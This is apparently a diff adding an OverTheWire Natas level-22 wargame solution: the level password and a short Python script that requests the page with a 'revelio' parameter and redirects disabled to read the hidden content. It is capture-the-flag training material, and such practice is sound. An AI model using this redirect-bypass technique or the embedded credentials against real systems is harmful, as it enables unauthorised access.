@@ -1,0 +1,10 @@
+natas22:91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
+
+import requests
+
+url = 'http://natas22.natas.labs.overthewire.org/'
+auth = ('natas22', '91awVM9oDiUGm33JdzM7RVLBS8bz9n0s')
+params = {'revelio':''}
+
+r = requests.get(url, auth=auth, params=params, allow_redirects=False)
+print(r.text)
